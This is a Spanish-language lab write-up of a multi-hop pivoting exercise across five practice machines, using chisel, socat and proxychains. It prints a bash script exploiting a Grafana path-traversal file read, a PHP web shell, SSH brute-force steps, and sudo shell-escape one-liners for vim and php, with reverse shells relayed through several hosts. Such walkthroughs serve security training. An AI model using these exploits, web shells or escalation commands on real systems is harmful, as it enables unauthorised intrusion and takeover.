- Tags: #pivoting #socks5 #socat 
____
algunas imágenes pueden contener otras IPs puesto que son maquinas ya resueltas y son las mismas que se aplican en este ejercicio de pivoting por lo que se reutilizaron lo writeups previos.
____
![](attachment/3843923981bf389172c886b851fdf891.png)
## Maquina Move
_____
comenzamos la maquina con el escaneo de nmap para determinar los puertos abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.2 -oG allport
```

despues aplicamos el escaneo para conocer la versión y servicio que corren en los puertos

```shell
nmap -p <puertos> <direccion_ip> -sCV -oN target
```
____
![](attachment/7e909dfb511e29ce8a19d295f106f48e.png)
_____
tenemos tres puertos abiertos, investigaremos primero el puerto 21 puesto que es vulnerable.
___
![](attachment/ad3433ba113a716b1bd0df5243084831.png)
____
tenemos un archivo que parece ser de keepass, lo descargamos e intentamos acceder.
____
![](attachment/d8a75402787b1b56379633604ef32ebd.png)
___
pero nos da un error, y nos sugiere que la versión del archivo KeePass (.kdbx) no es compatible con la versión actual de `keepass2john`

por lo que veamos que tenemos en la web.
_____
![](attachment/1383219f940e11e51e3f18fb96f6e642.png)
___
tenemos un html, veamos que contiene.
____
![](attachment/e006d84742a5017ef814f07bda0325d2.png)
______
nos dice que accedamos a un directorio para poder leer el archivo pass.txt, hasta los momentos no tenemos acceso a ese directorio.

lo siguiente que haremos es revisar el puerto 3000 que tenemos y ver que encontramos.
____
![](attachment/6eb4b8b3cbca94167a3a8469c53f80e6.png)
_____
tenemos una versión, podemos buscar vulnerabilidades y ver que obtenemos.
_____
![](attachment/90b55b54d2b62d3841ffa693e612b810.png)
_____
tenemos una para esa versión lo que nos permite es mediante una vulnerabilidad LFI podremos leer archivos del sistema.

para eso tenemos un exploit en python, pero para practicar un poco el bash scripting diseñe mi propio script para explotar la vulnerabilidad.

```bash
#!/bin/bash

plugins=(
"mysql"
"news"
"nodeGraph"
"opentsdb"
"piechart"
"pluginlist"
"postgres"
"prometheus"
"stackdriver"
"stat"
"state-timeline"
"status-histor"
"table"
"table-old"
"tempo"
"testdata"
"text"
"timeseries"
"welcome"
"zipkin"
)

  

for i in ${plugins[@]}; do

output=$(curl --path-as-is http://10.10.10.2:3000/public/plugins/${i}/../../../../../../../../../../etc/passwd 2>/dev/null)

if [ $? -eq 0 ]; then
	echo -e "\n### Vulnerable: ${i} ###\n"
	echo "$output"
	break
else
	echo "Not Vulnerable: ${i}"
fi
done
```

no es la gran cosa pero cumple su función, aplicando el script podremos ver el /etc/passwd.
_____
![](attachment/d77389a92cace8d4e64515dff0ad12bb.png)
____
acá podemos ver usuarios del sistema, como grafana y freddy.

si podemos leer archivos del sistema tenemos que intentar leer el /tmp/pass.txt.
_______
![](attachment/a760677f0c82115eb4a9866578525e01.png)
____
tenemos lo que parece ser una contraseña por lo que intentaremos acceder por ssh con los dos usuarios que tenemos.
______
![](attachment/2d299ca6d9e6d1e3194c11e295c51acd.png)
___
accedimos con el usuario freddy por lo que aplicando sudo -l nos aparece que podemos ejecutar maintenance.py con root y sin contraseña, vemos que contiene el archivo y que permisos tiene.
_____
![](attachment/9205c3b0a6b2d35572025438d32b8227.png)
____
podemos modificar el archivo y aprovechar para convertirnos en root.
____
![](attachment/5b1e3f7db09b4a6e25d2cb30e027cc67.png)
_____
![](attachment/83033ebf4d220ebeb6031ec6d05692b8.png)
____
de esta forma obtenemos root.


____
## Pivotin whereismywebshell
_______
comenzamos configurando chisel y el proxichains para establecer el puente y acceder a la otra maquina.

tenemos dos segmentos de red.
_____
![](attachment/af65b79ac66bdc258c7296fd08aec032.png)
___
aplicamos un escaneo de red con un script de bash improvisado que no usa ping puesto que en la maquina no está instalado, en cambio utilizamos tcp.

```bash                                                      
#!/bin/bash

Ctrl_c() {
        echo -e "[!] Saliendo.....\n"
        tput cnorm 
        exit 1
}

trap Ctrl_c INT

tput civis

subnet="20.20.20"

for ip in {1..254}; do
  if timeout 1 bash -c "echo >/dev/tcp/$subnet.$ip/22" 2>/dev/null; then
    echo "Host $subnet.$ip is up"
  else
    echo "Host $subnet.$ip is down"
  fi
done
tput cnorm
```

de esta forma sabemos que otros hosts estan activos en el segundo segmento de red.

ahora si podemos configurar el chisel.
______
![](attachment/90e6f5e3636a2e02e0ec6b72da65e3e6.png)
___
ahora activamos el foxyproxy para poder acceder a la web.
____
![](attachment/fc90c428d8fbdaa7acc99860831fe0f2.png)
____
tenemos una web la cual si bajamos encontraremos ese mensaje.

aplicaremos fuzzing a la web para ver que encontramos, utilizaremos gobuster.

```shell
gobuster dir --proxy socks5://127.0.0.1:1080 -u http://20.20.20.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html | grep -vE "timeout|OK"
```

_____
![](attachment/47890ae2ad9f7ed1817a89fcd4a05339.png)
_____
tenemos un html y un php, veamos el html.
_____
![](attachment/fea997b910579bcc281580b0503f4244.png)
______
este mensaje hace referencia a al fichero .php que encontramos antes, no conocemos que codigo contiene el archivo pero por intuición podría ser código que nos permitirá ejecutar comandos pero nos falta un parámetro, el mismo parámetro que se coloca en `&_GET['parametro']`.

para encontrarlo aplicaremos fuzzing con wfuzz.

```shell
proxychains wfuzz --hc=500 -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://20.20.20.3/shell.php?FUZZ=id" 2>/dev/null | grep -v -e "|S-chain|-<>-127.0.0.1:1080-<><>-20.20.20.3:80-<><>-OK" -e "<><>-OK"
```

tuve que filtrar la salida para ver solo lo que me interesaba es por eso que el wfuzz se ve un poco sobre cargado. 
____
![](attachment/0c88baceb9c3ac11a747ee328e2b52fd.png)
____
ya que tenemos el parámetro vamos a probar y ver que tal.
______
![](attachment/71a3fdf7bd513912ce09e4e7540dfd1f.png)
_____
tenemos ejecución de comandos por lo que nos enviaremos una reverse shell a nuestra maquina.

para que la reverse shell pueda llegar a nuestra maquina atacante debemos configurar socat para que redirija todo el trafico de un puerto a nuestro puerto que utilizaremos con netcat.
____
![](attachment/15e2270a399f5a2571b3b2eaf8aec8b4.png)
______
ganamos acceso y ahora debemos buscar la forma de escalar privilegios, por lo que enumeramos usuarios, permisos y procesos, pero no obtenemos nada solido.

por lo que recordamos que el mensaje que nos salia en la web el cual decía que había un secretito en tmp.
_____
![](attachment/2b461e9a34302389d3ee689f2ddf8cc0.png)
____
por lo que tenemos la contraseña de root.
___
![](attachment/f285fe35513a04fc3830d1afe49465d9.png)


## Pivoting Inclusion
_______
configuramos una `authorized_keys` para conectarnos por ssh y poder transferir el chisel, antes de configurar el chisel debemos configurar el proxychains, activando del dinamyc_chains y creando un nuevo socks5.

una vez hacemos todo eso, ahora si podemos comenzar a configurar el chisel.
_____
![](attachment/398a81ab333d7b4406c988d6356c9fe7.png)
_______
ahora tendremos acceso a la maquina inclusion, por lo que empezaremos con el reconocimiento con los escaneos típicos de nmap en el cual conoceremos los puertos abiertos.

```shell
proxychains nmap --top-ports 500 --open -T5 -v -n 30.30.30.3 -sT -Pn -oG allports 2>&1 | grep -vE "timeout|OK"
```

para posteriormente aplicar el escaneo de versiones y servicios del mismo nmap por lo que continuemos.

``` shell
proxychains nmap -sT -Pn -sCV -p 22,80 30.30.30.2 -oN targeted 2>&1 | grep -v "OK"
```

tenemos una pagina web la cual tiene la page de apache2 cuando esta recién instalado.

aplicando fuzzing con gobuster encontramos que tiene un directorio. 
_____
![](attachment/635f02711349a7dc75e9a6c0c9d958db.png)
______
si vemos el directorio nos encontraremos con lo siguiente.
_____
![](attachment/090ea416651a5672d9ebf061adb81c62.png)
_____
esto ya es un indicativo que nos permitirá guiarnos y lograr conseguir algo. 
____
![](attachment/7f03e5450e35b885c3bada496df2bce9.png)
______
tenia pinta de ser un RCE por como estaba representado en la imagen anterior pero resulto ser un escenario para explotar un Local File Inclusión.

esto nos da a conocer dos usuarios a los cuales aplicaremos fuerza bruta para ver si podemos acceder por ssh.
_____
![](attachment/d4f58c694141aee469b7ef81d1345311.png)
____
utilice hydra al principio pero estaba tardando mucho por lo que al final opte por crackmapexec. 

lo importante es que tenemos credenciales por lo que accedemos a la maquina por ssh.
____
![](attachment/d1201232356bf2eac2638d5a799187f7.png)
______
tenemos el usuario manchi y debemos pivotar al usuario seller, no vemos vectores obvios que nos permitan pivotar al usuario seller por lo que usaremos fuerza bruta para encontrar sus credenciales.

con un script de mario y una parte de diccionario de rockyou puesto que el original es muy pesado, separe una parte de mil contraseñas y ese fue el que utilice.

```shell
split -l 1000 /ruta/del/diccionario part_
```

utilizando ese comando para dividirlo.
____
![](attachment/d0469c695c5a7419482256fcd235fb7c.png)
_____
tenemos una contraseña para el usuario seller, por lo que ahora veremos como escalar a root.
____
![](attachment/f24f83b759b606af661ddd69ff81cb1a.png)
_____
podemos ejecutar php sin proporcionar contraseña, por lo que aplicamos el siguiente comando de php.

```php
sudo su php -r "system('/bin/bash')"
```

____
![](attachment/27b9c5c926f33971138301a2b8fd2149.png)
____
y es así que logramos completar la maquina.


## Pivoting Trust
______
configuramos el socat y chisel para abrir un nuevo tunel, añadiendo un nuevo socks5, esto nos permitirá abrir otra sesión en el server del chisel.
_____
![](attachment/843e780d982097b1e6acbb9b09a46158.png)
______
acá la configuración del proxychains.
_____
![](attachment/e74df51359976cfd574e3d649469f3c9.png)
_____
ahora que tenemos alcance podemos empezar a realizar los escaneos con nmap.

comenzamos aplicando el escaneo básico de nmap en este caso con el proxychains.
___
![](attachment/e181f9080e94d7a87f37f47ef4368855.png)
_____
tenemos dos puertos abiertos, procedemos a aplicar los scripts básicos de reconocimiento.
____
![](attachment/5f004817bac6ab65daf48cfa54298612.png)
_____
investigando la web no encontramos nada interesante por lo que aplicaremos fuzzing con gobuster para ver que encontramos. 
_____
![](attachment/4971e4dbcc88478e6be6564827b4f8b2.png)
_____
tenemos un fichero .php que al entrar en el mismo nos aparece lo siguiente.
___
![](attachment/9aec24d67d4ce8831f43df38010b3f62.png)
____
por lo que mario es un posible usuario, probemos y apliquemos fuerza bruta con hydra.
____
![](attachment/3d389c1dec74e4c1317ca02db2118bd4.png)
_____
tenemos una credencial par el usuario mario y podemos conectarnos por ssh.
____
![](attachment/7c6de31c3842394fdb0face887630ec5.png)
____
aplicando el sudo -l vemos que podemos ejecutar vim sin proporcionar contraseña por lo que veamos la forma de escalar privilegios.
______
![](attachment/87290480a9d0c313c47a52922f222255.png)
____
tenemos que aplicando el siguiente comando ya podremos ser root.

```bash
sudo vim -c ':!/bin/bash'
```


## Pivoting Upload
_______
ya esta es la ultima maquina a la cual vamos a pivotar por lo que configuremos el chisel y socat una ultima vez.

también debemos crear un nuevo socks5 para esta nueva sesión en el server de chisel.
______
![](attachment/f80b3deb421ec269c721ae9a98f68997.png)
_____
acá la configuración del proxychains.
_____
![](attachment/ed103b44c32377baaa24d2a47d83fa1e.png)
______
para realizar estas conexiones siempre debemos pensar que maquina tiene conexión con la otra.

ahora podemos configurar un nuevo proxy con foxyproxy para poder acceder a la web del nuevo host.
______
![](attachment/837589954fd293469d8b028371b27a38.png)
_____
de esta forma podremos ver la web del ultimo host.
____
![](attachment/dfc457b7b05c2b0d531e99e05bdc2c6f.png)
____
también tenemos que aplicar los escaneos con nmap.

nos reporta un único puerto abierto.

y es una pagina web que nos permite cargar un archivo, por lo que cargamos un archivo .php con el siguiente codigo.

```php
<?php
system($_GET['cmd']);
?>
```

esto nos permitirá ejecutar comando de forma remota. 

por lo que ahora nos enviamos una reverse shell para ganar acceso a la maquina.

pero antes debemos configurar con socat para que nos pueda llegar esa reverse shell.
____
![](attachment/3e46bbb7ab04b60abcfac6808e738100.png)
______
esto se hace para redirigir todo el trafico que pase por el puerto 5555 a nuestra maquina atacante, por lo que la reverse shell que enviemos primero debe de pasar por 4 maquinas hasta por fin llegar a la nuestra.
_______
![](attachment/aaa943a537a56aa4006f4b741240e8ea.png)
______
todo esto hace que la reverse shell llegue y que podamos tener acceso a la ultima maquina.

una vez conectados aplicamos el tratamiento de la tty y vemos como escalar privilegios.
______
![](attachment/42b8f0adc47c2cfa0e83dacfd1677768.png)
_____
podíamos ejecutar env como root sin proporcionar contraseña de esa forma escalaríamos a root, completando así la ultima maquina.



